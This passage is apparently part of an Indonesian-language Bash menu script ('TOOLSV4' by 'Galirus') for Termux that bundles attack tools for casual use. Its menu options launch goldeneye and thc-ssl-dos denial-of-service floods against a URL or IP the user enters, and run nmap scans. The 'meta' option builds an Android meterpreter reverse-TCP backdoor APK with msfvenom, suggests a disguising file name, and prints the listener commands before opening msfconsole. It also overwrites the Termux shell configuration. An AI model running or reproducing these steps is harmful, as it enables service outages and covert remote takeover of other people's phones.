echo $q $k "Menginstall Package"
sleep 2
sudo apt install goldeneye
sleep 2
echo $q $k "Berhasil Menginstall"
clear
echo $q $k "GOLDEN EYE"
echo
echo $q $m "Contoh :$h https://google.com"
read -p "URL terget > " ini
goldeneye $ini -s 100
read -p "ENTER UNTUK MENGULANGI TOOLSV4" galirus

elif [ "$no" = "Dos3" ]
then
echo $q $k "Menginstall package"
sleep 2
sudo apt install thc-ssl-dos
sleep 2
echo $q $k "BERHASIL menginstall"
clear
thc-ssl-dos
read -p "IP > " isi
read -p "PORT > " isii
clear
thc-ssl-dos -l 100 $isi $isii --accept
elif [ "$no" = "Dos4" ]
then
echo $q $k "Menginstall package"
sleep 2
sudo apt install nmap
sleep 2
echo $q $k "Membuka nmap"
nmap
read -p "Ip Target > " isi
sleep 2
nmap -n $isi
elif [ "$no" = "meta" ]
then
echo $q $k "Menginstall Metaspolit"
sleep 3
sudo apt install metasploit-framework
sleep 3
clear
echo $q $m "		Silahkan Membuat Apknya dulu !$h"
read -p "	Masukkan IP > " ip
read -p "	Masukkan Port > " port
sleep 2
echo $q $k "		contoh nama apk$m *Simontok.apk*$h"
sleep 2
read -p "	Nama Apk > " apk
sleep 2
clear
echo $q $k "sabaar lagi membuat backdoor"
echo $q $bl "=========================================="
msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -o /sdcard/$apk
echo
echo $q $bl "=========================================="
echo $q $k "Apk yang anda Nama i sudah Ada Di SDCARD"
sleep 2
echo $q $bl "Silahkan Check"
read -p "ENTER untuk Masuk Ke mode msfconsole" enter
clear
figlet "Galirus" | lolcat
echo
echo $q $m "Kode yang Harus Anda Salin"
echo $q $h"=========================================="
sleep 1
echo $q $bl "use exploit/multi/handler"
sleep 1
echo $q $bl "set payload android/meterpreter/reverse_tcp"
sleep 1
echo $q $bl "set lhost $ip"
sleep 1
echo $q $bl "set lport $port"
sleep 1
echo $q $bl "run"
sleep 1
echo $q $h "=========================================="
echo $q $m "TOLONG JANGAN DI SCRENSHOT"
echo $q $m "ip$k dan$m port$k di atas bersifat private anda"
echo
msfconsole
elif [ $no = "exif" ]; then
sudo apt install exiftool -y
clear
$e $q $p " Silahkan Tempel urutan Letakan Foto,Video"
$e $q $k " Contoh : /storage/emulated/0/logo.png"
sleep 3
read -p " Tempel Yang Mau Di EKSEKUSI ( FILE )  > " exif
exiftool $exif
read -p "ENTER UNTUK MENGULANGI TOOLSV4" galirus


#KATEGORI TOOLSV4

elif [ "$no" = "update" ]
then
clear
echo $q $k "MENGUPDATE TOOLSV4"
echo $q $h
git add README.sh
git stash
git pull origin main
git add README.sh
git stash
clear
echo $q $k "UPDATE SELESAI"
sleep 3
read -p "ENTER UNTUK MENGULANGI TOOLSV4" galirus

sleep 3
clear
bash install.sh
elif [ "$no" = "info" ]
then
clear
echo $q $m "==================================="
echo $q $h "       LIST TERBARU/UPDATE $v "
echo $q $m "==================================="
echo $q $bl " •$h Bot1 "
echo $q $bl " •$h Bot2 "
echo $q $bl " •$h 47"
echo $q $bl " •$h Patner"
echo $q $m "===================================$h"
read -p " ENTER UNTUK MENGULANGI TOOLS4"
elif [ "$no" = "dosa" ]
then
echo "Link TELEGRAM"
$url "https://t.me/squidwardyahahayuk"
elif [ $no = "report" ]
then
clear
$e $q $m "========================================"
$e $q $k "          $m∆$k LAPOR BUG $m∆"
$e $q $m "========================================"
echo $q $h "Untuk melaporkan Bug\n Anda harus berada dimana script yang error\n Jika sudah screenshot script yang$m ERROR$h\n dan kirim ke whatsapp saya !"
$e $q $m "========================================$bl"
read -p " ENTER UNTUK MELAPORKAN BUG"
$url "https://wa.me/6285850268349?text=Assalamualaikum%20Bang%20Saya%20Nemu%20BUG%20TOOLSV4"
elif [ $no = "patner" ]; then
killall play
play -q sound/patner.mp3 &>/dev/null
play -q sound/patner2.np3 &>/dev/null &
$e $q $b "[$bl 1$b ]$k JADI PATNER"
$e $q $b "[$bl 2$b ]$k KEMBALI KE SEMULA"
$e $q $b "[$bl 0$b ]$k BATAL"
read -p " pilih ( 0-2 ) : " pat
if [ $pat = "1" ]; then
cp -f $HOME/TOOLSV4/galirus/bash.bashrc /data/data/com.termux/files/usr/etc
echo $q $h "Selamat Tampilan Termux Anda Menjadi TOOLSV4\n Semoga Anda Menikmati Toolsnya "
sleep 5
elif [ $pat="2" ]; then
cp -f $HOME/TOOLSV4/bash.bashrc /data/data/com.termux/files/usr/etc
elif [ $pat="0" ]; then
echo $q $k "MENGULANGI TOOLSV4"
else
echo " Input Salah, Silahkan Ulang i"
play -q sound/input_salah.mp3 &>/dev/null
fi
elif [ "$no" = "0" ]
then
killall play
$url "https://saweria.co/Galirus"
play -q sound/donasi.mp3 &>/dev/null
exit 3
else
killall play
echo $q $m "Pilihan Tidak Valid"
play -q sound/input_salah.mp3 &>/dev/null
fi
done
fi
play -q sound/sambutan.mp3 &>/dev/null
play -q sound/pengumuman.mp3 &>/dev/null
sleep 2
xdg-open "https://sfile.mobi/bsjXEMF6X67"
$e $q $p
read -s -p "    •   Apikey : " galirus
if [ "$galirus" = "$titid" ]; then
$e $q $h
function show_loading() {
local x=0
local delay=0.1
local spin_chars="-\|/"
local spin_length=${#spin_chars}
while true; do
local char=${spin_chars:x++%spin_length:1}
printf '\r%s' "  Loading $char"
sleep $delay
done
}
show_loading &
sleep 10
kill $!
play -q sound/robot.mp3 &>/dev/null &
printf '\r%s\n' " Anda Terverifikasi"
sleep 3
xdg-open  "https://wa.me/6285850268349?text=Apikey%20ME %20:%20$word"
touch $gal
bash README.sh
else
$e $q $h
function show_loading() {
local x=0
local delay=0.1
local spin_chars="-\|/"
local spin_length=${#spin_chars}
while true; do
local char=${spin_chars:x++%spin_length:1}
printf '\r%s' "Loading $char"
sleep $delay
done
}
show_loading &
sleep 10
kill $!
printf '\r%s\n' " ID Tidak Valid"
sleep 3
bash README.sh
fi
